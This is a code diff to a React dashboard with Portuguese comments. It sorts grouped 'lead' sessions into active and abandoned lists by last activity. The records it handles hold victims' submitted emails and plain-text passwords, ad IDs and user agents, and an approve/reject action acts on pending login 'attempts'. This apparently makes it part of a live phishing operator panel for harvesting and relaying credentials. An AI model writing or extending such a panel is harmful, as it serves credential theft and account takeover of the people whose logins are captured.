@@ -436,14 +436,18 @@ export default function Dashboard() {
 
   // Sessões em andamento: têm e-mail mas não têm tentativa pendente acionável.
   // (Quem já tá em "Ao vivo" sai daqui pra evitar duplicar.)
-  const activeSessions: ActiveSession[] = useMemo(() => {
+  // Sessões com última atividade > 1h são consideradas "abandonadas" e descem
+  // pro Histórico (mesmo incompletas).
+  const { activeSessions, staleSessions } = useMemo(() => {
     const bySession = new Map<string, LeadRow[]>();
     for (const l of leads) {
       const arr = bySession.get(l.session_id) || [];
       arr.push(l);
       bySession.set(l.session_id, arr);
     }
-    const out: ActiveSession[] = [];
+    const active: ActiveSession[] = [];
+    const stale: ActiveSession[] = [];
+    const cutoff = nowTick - ACTIVE_SESSION_TTL_MS;
     for (const [sid, items] of bySession) {
       const emails = items.filter((i) => i.field_name === "email_submitted");
       if (emails.length === 0) continue;
@@ -459,17 +463,26 @@ export default function Dashboard() {
         .filter((i) => i.field_name === "password_submitted")
         .sort((a, b) => a.created_at.localeCompare(b.created_at))
         .pop();
-      out.push({
+      const session: ActiveSession = {
         session_id: sid,
         ad_id: items[0].ad_id,
         email,
         password: passwordRow?.value || "—",
         user_agent: items.find((i) => i.user_agent)?.user_agent ?? null,
         lastActivity,
-      });
+      };
+      const lastActivityMs = Date.parse(lastActivity);
+      if (Number.isFinite(lastActivityMs) && lastActivityMs < cutoff) {
+        stale.push(session);
+      } else {
+        active.push(session);
+      }
     }
-    return out.sort((a, b) => b.lastActivity.localeCompare(a.lastActivity));
-  }, [leads]);
+    return {
+      activeSessions: active.sort((a, b) => b.lastActivity.localeCompare(a.lastActivity)),
+      staleSessions: stale.sort((a, b) => b.lastActivity.localeCompare(a.lastActivity)),
+    };
+  }, [leads, nowTick]);
 
   const send = async (row: AttemptRow, action: "approve" | "reject") => {
     setBusy(`${row.key}-${action}`);
